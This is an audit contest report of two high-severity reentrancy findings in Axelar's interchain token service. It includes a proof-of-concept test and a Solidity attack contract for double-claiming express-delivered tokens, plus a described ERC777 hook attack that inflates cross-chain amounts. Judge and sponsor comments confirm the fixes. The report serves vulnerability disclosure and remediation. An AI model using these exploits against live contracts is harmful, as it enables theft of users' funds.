[H-01]expressReceiveTokencan be abused using reentry
Submitted byimmeas, also found bynobody2018
A token transfer can be express delivered on behalf of another user when the call contains data to be executed:
https://github.com/code-423n4/2023-07-axelar/blob/main/contracts/its/interchain-token-service/InterchainTokenService.sol#L467-L487
File:its/interchain-token-service/InterchainTokenService.sol467:functionexpressReceiveTokenWithData(// ... params475:    )external{476:if(gateway.isCommandExecuted(commandId))revertAlreadyExecuted(commandId);477:478:addresscaller=msg.sender;479:ITokenManagertokenManager=ITokenManager(getValidTokenManagerAddress(tokenId));480:IERC20token=IERC20(tokenManager.tokenAddress());481:482:SafeTokenTransferFrom.safeTransferFrom(token,caller,destinationAddress,amount);483:484:_expressExecuteWithInterchainTokenToken(tokenId,destinationAddress,sourceChain,sourceAddress,data,amount);485:486:_setExpressReceiveTokenWithData(tokenId,sourceChain,sourceAddress,destinationAddress,amount,data,commandId,caller);487:    }
The issue here, is that check effect interactions are not followed.
There are two attack paths here with varying assumptions and originating parties:
Attacker: Anyone, assuming there are third parties providingexpressReceiveTokenWithDataon demand with on-chain call:
An attacker sends a large token transfer to a chain with a public mempool.Once the attacker sees the call by Axelar toAxelarGateway::exectutein the mempool, they front-run this call with a call to the third party providingexpressReceiveTokenWithData.The third party (victim) transfers the tokens to thedestinationAddresscontract. Attacker is now+amountfrom this transfer.expressExecuteWithInterchainTokenon thedestinationAddresscontract does a call toAxelarGateway::exectute(which can be called by anyone) to submit the report and then a reentry call toInterchainTokenService::executetheircommandId. This performs the second transfer from theTokenManagerto thedestinationAddress(since the_setExpressReceiveTokenWithDatahas not yet been called). Attacker contract is now+2x amount, having received both the express transfer and the original transfer._setExpressReceiveTokenWithDatais set, but thiscommandIdhas already been executed. The victims funds have been stolen.
AxelarGateway operator, assuming there are third parties providingexpressReceiveTokenWithDataoff-chain call:
The operator does the same large transfer as described above. The operator then holds the update toAxelarGateway::executeand instead, sends these instructions to their maliciousdestinationContract. When theexpressReceiveTokenWithDatais called, this malicious contract will do the same pattern as described above. CallAxelarGateway::executethenInterchainTokenService::execute.
The same attacks could work for tokens with transfer callbacks (like ERC777) with just theexpressReceiveTokencall, as well.
Impact
With a very large cross chain token transfer, a malicious party can use this to steal the same amount from the express receive executor.
If this fails, since it relies on front-running and some timing, the worst thing that happens for the attacker is that the transfer goes through and they’ve just lost the transfer fees.
Note to judge/sponsor
This makes some assumptions about how trusted an operator/reporter is and that there are possibilities to haveexpressReceiveTokensto be called essentially on demand (”ExpressReceiveAsAService”). If these aren’t valid, please regard this as a low; just noting the failure to follow checks-effects-interactions inexpressReceiveToken/WithData.
The existence ofexpressReceiveimplies though, that there should be some kind of service providing this premium service for a fee.
Proof of Concept
Test intokenService.js:
it('attacker steals funds from express executor',async()=>{const[token,tokenManager,tokenId] =awaitdeployFunctions.lockUnlock(`Test Token Lock Unlock`,'TT',12,amount*2);awaittoken.transfer(tokenManager.address,amount);constexpressPayer= (awaitethers.getSigners())[5];awaittoken.transfer(expressPayer.address,amount);awaittoken.connect(expressPayer).approve(service.address,amount);constcommandId=getRandomBytes32();constrecipient=awaitdeployContract(wallet,'ExpressRecipient',[gateway.address,service.address,service.address.toLowerCase()]);constdata='0x'constpayload=defaultAbiCoder.encode(['uint256','bytes32','bytes','uint256','bytes','bytes'],[SELECTOR_SEND_TOKEN_WITH_DATA,tokenId,recipient.address,amount,service.address,data],);constparams=defaultAbiCoder.encode(['string','string','address','bytes32','bytes32','uint256'],[sourceChain,sourceAddress,service.address,keccak256(payload),getRandomBytes32(),0],);awaitrecipient.setData(params,commandId);// expressPayer express pays triggering the reentrancyawaitservice.connect(expressPayer).expressReceiveTokenWithData(tokenId,sourceChain,service.address,recipient.address,amount,data,commandId,);// recipient has gotten both the cross chain and express transferexpect(awaittoken.balanceOf(recipient.address)).to.equal(amount*2);});
Andits/test/ExpressRecipient.sol:
// SPDX-License-Identifier: MITpragmasolidity^0.8.0;import{MockAxelarGateway}from'./MockAxelarGateway.sol';import{IInterchainTokenExpressExecutable}from'../interfaces/IInterchainTokenExpressExecutable.sol';import{AxelarExecutable}from'../../gmp-sdk/executable/AxelarExecutable.sol';import{AddressBytesUtils}from'../libraries/AddressBytesUtils.sol';contractExpressRecipientisIInterchainTokenExpressExecutable{usingAddressBytesUtilsforaddress;bytesprivateparams;MockAxelarGatewayprivategateway;AxelarExecutableprivateinterchainTokenService;bytes32privatecommandId;stringprivatesourceAddress;constructor(MockAxelarGateway_gateway_,AxelarExecutable_its,stringmemory_sourceAddress) {gateway=_gateway_;interchainTokenService=_its;sourceAddress=_sourceAddress;}functionsetData(bytesmemory_params,bytes32_commandId)public{params=_params;commandId=_commandId;}functionexpressExecuteWithInterchainToken(stringcalldatasourceChain,bytesmemorysadd,bytescalldatadata,bytes32tokenId,uint256amount)public{// this uses the mock call from tests but a real reporter would// have all data needed to make this call the proper waygateway.approveContractCall(params,commandId);bytesmemorypayload=abi.encode(uint256(2),tokenId,address(this).toBytes(),amount,sadd,data);// do the reentrancy and execute the transferinterchainTokenService.execute(commandId,sourceChain,sourceAddress,payload);}functionexecuteWithInterchainToken(stringcalldata,bytescalldata,bytescalldata,bytes32,uint256)public{}}
Recommended Mitigation Steps
Consider using_setExpressReceiveTokenWithDatabefore external calls.
Assessed type
Reentrancy
berndartmueller (judge) commented:
Besides being very difficult to follow and understand, there are many assumptions on trust assumption violations.
deanamiel (Axelar) confirmed and commented:
This vulnerability has been addressed. See PRhere.
berndartmueller (judge) commented:
After a more thorough review, it is evident that theInterchainTokenService.expressReceiveTokenWithData, and, under certain conditions such as the use of ERC-777 tokens,InterchainTokenService.expressReceiveTokenfunctions are vulnerable to reentrancy due to violating the CEI-pattern.Consequently, funds can be stolen by an attacker from actors who attempt to fulfill token transfers ahead of time via the express mechanism. Thus, considering this submission as a valid high-severity finding.Hats off to the wardens who spotted this vulnerability!

[H-02] ERC777 and similar token implementations allow a stealing of funds when transferring tokens
Submitted byJeiwan, also found bynobody2018
A malicious actor can trick aTokenManagerinto thinking that a bigger amount of tokens were transferred. On the destination chain, the malicious actor will be able to receive more tokens than they sent on the source chain.
Proof of Concept
TokenManagerLockUnlockandTokenManagerLiquidityPoolareTokenManagerimplementations that transfer tokens from/to users when sending tokens cross-chain. The low-level_takeTokenfunction (TokenManagerLiquidityPool._takeToken,TokenManagerLockUnlock._takeToken) is used to take tokens from a user on the source chain before emitting a cross-chain message, e.g. via theTokenManager.sendTokenfunction. The function computes the difference in the balance of the liquidity pool or the token manager before and after the transfer, to track the actual amount of tokens transferred. The amount is thenpassed in the cross-chain messageto tell theInterchainTokenServicecontract on the destination chainhow many tokens to give to the recipient.
The_takeTokenfunction, however, is not protected from reentrance, which opens up the following attack scenario:
A malicious contract initiates transferring of 100 ERC777 tokens by callingTokenManager.sendToken.The_takeTokenfunction callstransferFromon the ERC777 token contract, which calls thetokensToSendhook on the malicious contract (the sender).In the hook, the malicious contract makes another call toTokenManager.sendTokenand sends 100 more tokens.In the nested_takeTokencall, the balance change will equal 100 since, in ERC777, the balance state is updated only after thetokensToSendhook, so only the re-entered token transfer will be counted.The re-entered call toTokenManager.sendTokenwill result in 100 tokens transferred cross-chain.In the first_takeTokencall, the balance change will equal 200 because the balance of the receiver will increase twice during thetransferFromcall; once for the first call and once for the re-entered call.As a result, the malicious contract will transfer 100+100 = 200 tokens, but theTokenManagercontract will emit two cross-chain messages; one will transfer 100 tokens (the re-entered call) and the other will transfer 200 tokens (the first call). This will let the malicious actor to receive 300 tokens on the destination chain, while spending only 200 tokens on the source chain.
Since the protocol is expected to support different implementations of ERC20 tokens, including custom ones, the attack scenario is valid for any token implementation that uses hooks during transfers.
Recommended Mitigation Steps
Consider adding re-entrancy protection to theTokenManagerLiquidityPool._takeTokenandTokenManagerLockUnlock._takeTokenfunctions, for example by using theReentrancyGuardfrom OpenZeppelin.
Assessed type
Reentrancy
deanamiel (Axelar) confirmed and commented:
We have added a separate token manager for fee on transfer tokens, which is protected from reentrancy.Link to the public PR:https://github.com/axelarnetwork/interchain-token-service/pull/96.

